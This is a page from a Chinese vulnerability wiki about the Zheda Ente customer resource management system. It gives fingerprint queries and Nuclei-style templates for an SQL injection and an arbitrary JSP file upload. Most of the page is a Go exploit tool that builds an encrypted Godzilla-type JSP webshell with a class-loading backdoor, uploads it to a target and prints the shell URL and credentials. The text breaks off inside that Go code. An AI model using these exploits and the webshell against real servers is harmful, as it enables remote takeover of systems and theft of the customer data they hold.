<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>浙大恩特客户资源管理系统 文件上传和sql注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\u6d59\u5927\u6069\u7279\u5ba2\u6237\u8d44\u6e90\u7ba1\u7406\u7cfb\u7edf \u6587\u4ef6\u4e0a\u4f20\u548csql\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
          ]},
          {title: "\u7279\u5f81", url: "#_1", children: [
          ]},
          {title: "SQL\u6ce8\u5165", url: "#sql_1", children: [
          ]},
          {title: "\u6587\u4ef6\u4e0a\u4f201", url: "#1", children: [
          ]},
          {title: "\u6587\u4ef6\u4e0a\u4f202", url: "#2", children: [
          ]},
          {title: "\u6587\u4ef6\u4e0a\u4f203", url: "#3", children: [
          ]},
          {title: "\u6587\u4ef6\u4e0a\u4f204", url: "#4", children: [
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FQuotegask_editAction%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FQuotegask_editAction%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        浙大恩特客户资源管理系统Quotegask_editAction存在SQL注入漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-purchaseaction.entphone%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%E6%B5%99%E5%A4%A7%E6%81%A9%E7%89%B9%E5%AE%A2%E6%88%B7%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-purchaseaction.entphone%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        浙大恩特客户资源管理系统 purchaseaction.entphone接口存在SQL漏洞
      </a>
    </div>
    
  </div>

    

    <h2 id="sql">浙大恩特客户资源管理系统 文件上传和sql注入漏洞<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h2>
<h2 id="_1">特征<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>app.name=&quot;浙大恩特 CRM&quot;
app=&quot;浙大恩特客户资源管理系统&quot;
</code></pre></div>
<h2 id="sql_1">SQL注入<a class="headerlink" href="#sql_1" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">enter-T0140_editAction-api-sqli</span>

<span class="nt">info</span><span class="p">:</span>
<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">浙大恩特客户资源管理系统T0140_editAction.entweb;.js接口sql注入漏洞</span>
<span class="w">  </span><span class="nt">author</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">YGnight</span>
<span class="w">  </span><span class="nt">severity</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">high</span>
<span class="w">  </span><span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">description</span>
<span class="w">  </span><span class="nt">reference</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://</span>
<span class="w">  </span><span class="nt">metadata</span><span class="p">:</span>
<span class="w">    </span><span class="nt">verified</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">max-request</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1</span>
<span class="w">    </span><span class="nt">fofa-query</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">app=&quot;浙大恩特客户资源管理系统&quot;</span>


<span class="nt">requests</span><span class="p">:</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">raw</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="p p-Indicator">|+</span>
<span class="w">        </span><span class="no">GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&amp;documentnum=1 HTTP/1.1</span>
<span class="w">        </span><span class="no">Host: {{Hostname}}</span>
<span class="w">        </span><span class="no">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0</span>
<span class="w">        </span><span class="no">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="w">        </span><span class="no">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class="w">        </span><span class="no">Accept-Encoding: gzip, deflate, br</span>
<span class="w">        </span><span class="no">Connection: close</span>
<span class="w">        </span><span class="no">Cookie: JSESSIONID=1DAEEF5E703FF40871BD44A67C1EEDD5; JSESSIONID=2C6DAAA80F315B114CD65C9DA80D8D8C</span>
<span class="w">        </span><span class="no">Upgrade-Insecure-Requests: 1</span>

<span class="w">    </span><span class="nt">matchers-condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">and</span>
<span class="w">    </span><span class="nt">matchers</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">status</span>
<span class="w">        </span><span class="nt">status</span><span class="p">:</span>
<span class="w">          </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">200</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">word</span>
<span class="w">        </span><span class="nt">words</span><span class="p">:</span>
<span class="w">          </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;0&#39;</span>
</code></pre></div>
<h2 id="1">文件上传1<a class="headerlink" href="#1" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">enter-machord_doc-api-fileupload</span>

<span class="nt">info</span><span class="p">:</span>
<span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">浙大恩特客户资源管理系统machord_doc.jsp;.js接口任意文件上传</span>
<span class="w">  </span><span class="nt">author</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">YGnight</span>
<span class="w">  </span><span class="nt">severity</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">high</span>
<span class="w">  </span><span class="nt">description</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">description</span>
<span class="w">  </span><span class="nt">reference</span><span class="p">:</span>
<span class="w">    </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">https://</span>
<span class="w">  </span><span class="nt">metadata</span><span class="p">:</span>
<span class="w">    </span><span class="nt">verified</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
<span class="w">    </span><span class="nt">max-request</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1</span>
<span class="w">    </span><span class="nt">fofa-query</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">app=&quot;浙大恩特客户资源管理系统&quot;</span>


<span class="nt">requests</span><span class="p">:</span>
<span class="w">  </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">raw</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="p p-Indicator">|-</span>
<span class="w">        </span><span class="no">POST /entsoft_en/Storage/machord_doc.jsp;.js?formID=upload&amp;machordernum=&amp;fileName=night.jsp&amp;strAffixStr=&amp;oprfilenam=null&amp;gesnum= HTTP/1.1</span>
<span class="w">        </span><span class="no">Host: {{Hostname}}</span>
<span class="w">        </span><span class="no">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq</span>
<span class="w">        </span><span class="no">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
<span class="w">        </span><span class="no">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
<span class="w">        </span><span class="no">Accept-Encoding: gzip, deflate</span>
<span class="w">        </span><span class="no">Connection: close</span>
<span class="w">        </span><span class="no">Content-Type: multipart/form-data; boundary=----4225820000370152680749129212</span>
<span class="w">        </span><span class="no">Content-Length: 548</span>

<span class="w">        </span><span class="no">------4225820000370152680749129212</span>
<span class="w">        </span><span class="no">Content-Disposition: form-data; name=&quot;oprfilenam&quot;</span>

<span class="w">        </span><span class="no">null</span>
<span class="w">        </span><span class="no">------4225820000370152680749129212</span>
<span class="w">        </span><span class="no">Content-Disposition: form-data; name=&quot;uploadflg&quot;</span>

<span class="w">        </span><span class="no">0</span>
<span class="w">        </span><span class="no">------4225820000370152680749129212</span>
<span class="w">        </span><span class="no">Content-Disposition: form-data; name=&quot;strAffixStr&quot;</span>


<span class="w">        </span><span class="no">------4225820000370152680749129212</span>
<span class="w">        </span><span class="no">Content-Disposition: form-data; name=&quot;selfilenam&quot;</span>


<span class="w">        </span><span class="no">------4225820000370152680749129212</span>
<span class="w">        </span><span class="no">Content-Disposition: form-data; name=&quot;uploadfile&quot;; filename=&quot;night.jsp&quot;</span>
<span class="w">        </span><span class="no">Content-Type: image/png</span>

<span class="w">        </span><span class="no">night</span>
<span class="w">        </span><span class="no">------4225820000370152680749129212--</span>

<span class="w">    </span><span class="nt">matchers-condition</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">and</span>
<span class="w">    </span><span class="nt">matchers</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">status</span>
<span class="w">        </span><span class="nt">status</span><span class="p">:</span>
<span class="w">          </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">200</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">word</span>
<span class="w">        </span><span class="nt">words</span><span class="p">:</span>
<span class="w">          </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;night.jsp&#39;</span>
</code></pre></div>
<h2 id="2">文件上传2<a class="headerlink" href="#2" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="kn">package</span><span class="w"> </span><span class="nx">main</span>

<span class="kn">import</span><span class="w"> </span><span class="p">(</span>
<span class="w">        </span><span class="s">&quot;bytes&quot;</span>
<span class="w">        </span><span class="s">&quot;crypto/md5&quot;</span>
<span class="w">        </span><span class="s">&quot;crypto/tls&quot;</span>
<span class="w">        </span><span class="s">&quot;encoding/json&quot;</span>
<span class="w">        </span><span class="s">&quot;fmt&quot;</span>
<span class="w">        </span><span class="s">&quot;github.com/hpifu/go-kit/hflag&quot;</span>
<span class="w">        </span><span class="s">&quot;github.com/liushuochen/gotable&quot;</span>
<span class="w">        </span><span class="s">&quot;github.com/thanhpk/randstr&quot;</span>
<span class="w">        </span><span class="s">&quot;io/ioutil&quot;</span>
<span class="w">        </span><span class="s">&quot;mime/multipart&quot;</span>
<span class="w">        </span><span class="s">&quot;net/http&quot;</span>
<span class="w">        </span><span class="s">&quot;os&quot;</span>
<span class="w">        </span><span class="s">&quot;strings&quot;</span>
<span class="w">        </span><span class="s">&quot;time&quot;</span>
<span class="p">)</span>

<span class="kd">type</span><span class="w"> </span><span class="nx">Resutl</span><span class="w"> </span><span class="kd">struct</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">VisitRoot</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="s">`json:&quot;visitRoot&quot;`</span>
<span class="w">        </span><span class="nx">FileName</span><span class="w">  </span><span class="kt">string</span><span class="w"> </span><span class="s">`json:&quot;fileName&quot;`</span>
<span class="w">        </span><span class="nx">Path</span><span class="w">      </span><span class="kt">string</span><span class="w"> </span><span class="s">`json:&quot;path&quot;`</span>
<span class="w">        </span><span class="nx">IsImage</span><span class="w">   </span><span class="kt">bool</span><span class="w">   </span><span class="s">`json:&quot;isImage&quot;`</span>
<span class="w">        </span><span class="nx">Msg</span><span class="w">       </span><span class="kt">string</span><span class="w"> </span><span class="s">`json:&quot;msg&quot;`</span>
<span class="p">}</span>

<span class="kd">func</span><span class="w"> </span><span class="nx">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">context</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">initGodZillaShell</span><span class="p">()</span>
<span class="w">        </span><span class="nx">str</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">gethost</span><span class="p">()</span>
<span class="w">        </span><span class="nx">s</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">str</span><span class="p">,</span><span class="w"> </span><span class="nx">context</span><span class="p">)</span>
<span class="w">        </span><span class="nx">shellURL</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">Replace</span><span class="p">(</span><span class="nx">str</span><span class="o">+</span><span class="nx">s</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;//ent&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/ent&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
<span class="w">        </span><span class="nx">tb</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">gotable</span><span class="p">.</span><span class="nx">Create</span><span class="p">(</span><span class="s">&quot;ShellURL&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ShellPass&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;ShellKey&quot;</span><span class="p">)</span>
<span class="w">        </span><span class="nx">_</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">tb</span><span class="p">.</span><span class="nx">AddRow</span><span class="p">([]</span><span class="kt">string</span><span class="p">{</span>
<span class="w">                </span><span class="nx">shellURL</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span>
<span class="w">        </span><span class="p">})</span>
<span class="w">        </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nx">tb</span><span class="p">)</span>
<span class="p">}</span>

<span class="kd">func</span><span class="w"> </span><span class="nx">initGodZillaShell</span><span class="p">()</span><span class="w"> </span><span class="p">(</span><span class="nx">shellContext</span><span class="p">,</span><span class="w"> </span><span class="nx">shellPassword</span><span class="p">,</span><span class="w"> </span><span class="nx">shellKey</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">password</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">randstr</span><span class="p">.</span><span class="nx">Hex</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
<span class="w">        </span><span class="nx">safeKey</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">randstr</span><span class="p">.</span><span class="nx">Hex</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>
<span class="w">        </span><span class="nx">md5Key</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">&quot;%x&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">md5</span><span class="p">.</span><span class="nx">Sum</span><span class="p">([]</span><span class="nb">byte</span><span class="p">(</span><span class="nx">safeKey</span><span class="p">)))[</span><span class="mi">0</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span>
<span class="w">        </span><span class="nx">shellContent</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="s">&quot;&lt;%! String xc=\&quot;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">md5Key</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;\&quot;; String pass=\&quot;&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;\&quot;; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(\&quot;AES\&quot;);c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),\&quot;AES\&quot;));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(\&quot;MD5\&quot;);m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName(\&quot;java.util.Base64\&quot;);Object Encoder = base64.getMethod(\&quot;getEncoder\&quot;, null).invoke(base64, null);value = (String)Encoder.getClass().getMethod(\&quot;encodeToString\&quot;, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\&quot;sun.misc.BASE64Encoder\&quot;); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod(\&quot;encode\&quot;, new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName(\&quot;java.util.Base64\&quot;);Object decoder = base64.getMethod(\&quot;getDecoder\&quot;, null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod(\&quot;decode\&quot;, new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName(\&quot;sun.misc.BASE64Decoder\&quot;); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod(\&quot;decodeBuffer\&quot;, new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%&gt;&lt;%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(\&quot;payload\&quot;)==null){session.setAttribute(\&quot;payload\&quot;,new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute(\&quot;parameters\&quot;,data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(\&quot;payload\&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}\n%&gt;&quot;</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">shellContent</span><span class="p">,</span><span class="w"> </span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">safeKey</span>
<span class="p">}</span>

<span class="kd">func</span><span class="w"> </span><span class="nx">gethost</span><span class="p">()</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">hflag</span><span class="p">.</span><span class="nx">AddFlag</span><span class="p">(</span><span class="s">&quot;target&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;浙大恩特地址&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">hflag</span><span class="p">.</span><span class="nx">Required</span><span class="p">(),</span><span class="w"> </span><span class="nx">hflag</span><span class="p">.</span><span class="nx">Shorthand</span><span class="p">(</span><span class="s">&quot;t&quot;</span><span class="p">))</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">hflag</span><span class="p">.</span><span class="nx">Parse</span><span class="p">();</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Println</span><span class="p">(</span><span class="nx">hflag</span><span class="p">.</span><span class="nx">Usage</span><span class="p">())</span>
<span class="w">                </span><span class="nx">os</span><span class="p">.</span><span class="nx">Exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">hflag</span><span class="p">.</span><span class="nx">GetString</span><span class="p">(</span><span class="s">&quot;target&quot;</span><span class="p">)</span>
<span class="p">}</span>
<span class="kd">func</span><span class="w"> </span><span class="nx">cli</span><span class="p">()</span><span class="w"> </span><span class="o">*</span><span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">c</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Client</span><span class="p">{</span><span class="nx">Transport</span><span class="p">:</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">http</span><span class="p">.</span><span class="nx">Transport</span><span class="p">{</span><span class="nx">TLSClientConfig</span><span class="p">:</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">tls</span><span class="p">.</span><span class="nx">Config</span><span class="p">{</span><span class="nx">InsecureSkipVerify</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">}}}</span>
<span class="w">        </span><span class="nx">c</span><span class="p">.</span><span class="nx">Timeout</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mi">15</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">c</span>
<span class="p">}</span>

<span class="kd">func</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">t</span><span class="p">,</span><span class="w"> </span><span class="nx">s</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">client</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">cli</span><span class="p">()</span>
<span class="w">        </span><span class="nx">buffer</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">bytes</span><span class="p">.</span><span class="nx">Buffer</span><span class="p">{}</span>
<span class="w">        </span><span class="nx">writer</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">multipart</span><span class="p">.</span><span class="nx">NewWriter</span><span class="p">(</span><span class="nx">buffer</span><span class="p">)</span>
<span class="w">        </span><span class="nx">filename</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">randstr</span><span class="p">.</span><span class="nx">Hex</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;.jsp&quot;</span>
<span class="w">        </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">writer</span><span class="p">.</span><span class="nx">CreateFormFile</span><span class="p">(</span><span class="s">&quot;file&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">filename</span><span class="p">)</span>
<span class="w">        </span><span class="nx">_</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">buffer</span><span class="p">.</span><span class="nx">WriteString</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span>
<span class="w">        </span><span class="nx">_</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">writer</span><span class="p">.</span><span class="nx">Close</span><span class="p">()</span>
<span class="w">        </span><span class="nx">target</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">Replace</span><span class="p">(</span><span class="nx">t</span><span class="o">+</span><span class="s">&quot;/entsoft/MailAction.entphone;.js?act=saveAttaFile&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;//en&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;/en&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span>
<span class="w">        </span><span class="nx">request</span><span class="p">,</span><span class="w"> </span><span class="nx">_</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">http</span><span class="p">.</span><span class="nx">NewRequest</span><span class="p">(</span><span class="nx">http</span><span class="p">.</span><span class="nx">MethodPost</span><span class="p">,</span><span class="w"> </span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">NewReader</span><span class="p">(</span><span class="nx">buffer</span><span class="p">.</span><span class="nx">String</span><span class="p">()))</span>
<span class="w">        </span><span class="nx">request</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nx">Set</span><span class="p">(</span><span class="s">&quot;Content-Type&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">writer</span><span class="p">.</span><span class="nx">FormDataContentType</span><span class="p">())</span>
<span class="w">        </span><span class="nx">request</span><span class="p">.</span><span class="nx">Header</span><span class="p">.</span><span class="nx">Set</span><span class="p">(</span><span class="s">&quot;User-Agent&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36&quot;</span><span class="p">)</span>
